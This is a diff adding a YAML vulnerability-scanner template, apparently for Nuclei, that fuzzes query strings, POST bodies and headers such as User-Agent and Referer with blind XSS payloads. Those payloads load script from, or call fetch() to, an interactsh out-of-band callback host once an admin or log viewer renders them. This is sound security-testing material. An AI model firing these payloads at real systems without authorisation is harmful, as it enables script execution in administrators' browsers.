@@ -1,0 +1,59 @@
+id: blind-xss-oob
+
+info:
+  name: Blind XSS via Out-of-Band Interactsh Callback
+  author: bugscanner
+  severity: high
+  description: |
+    Injects XSS payloads embedding an interactsh OOB callback URL into all
+    GET/POST parameters and selected HTTP headers (User-Agent, Referer,
+    X-Forwarded-For). Blind XSS fires asynchronously when an admin or log
+    viewer renders the stored payload — the interactsh HTTP callback confirms
+    execution. Commonly found in ticket systems, admin panels, and log viewers.
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting/blind
+  tags: custom,xss,blind-xss,oob,interactsh,oast,fuzz
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'len(query) > 0 || method == "POST"'
+
+    fuzzing:
+      # Inject into all query string parameter values
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - '"><script src="https://{{interactsh-url}}/bxss.js"></script>'
+          - "';fetch('https://{{interactsh-url}}/bxss');//"
+          - "<img src=x onerror=\"fetch('https://{{interactsh-url}}/bxss')\">"
+
+      # Inject into POST body values
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - '"><script src="https://{{interactsh-url}}/bxss.js"></script>'
+          - "<img src=x onerror=\"fetch('https://{{interactsh-url}}/bxss')\">"
+
+      # Inject into headers commonly stored and rendered (log correlation, admin dashboards)
+      - part: header
+        type: postfix
+        mode: single
+        keys:
+          - User-Agent
+          - Referer
+          - X-Forwarded-For
+          - X-Real-IP
+          - X-Custom-Header
+        fuzz:
+          - '"><script src="https://{{interactsh-url}}/bxss-hdr.js"></script>'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+        name: blind-xss-oob-callback-received
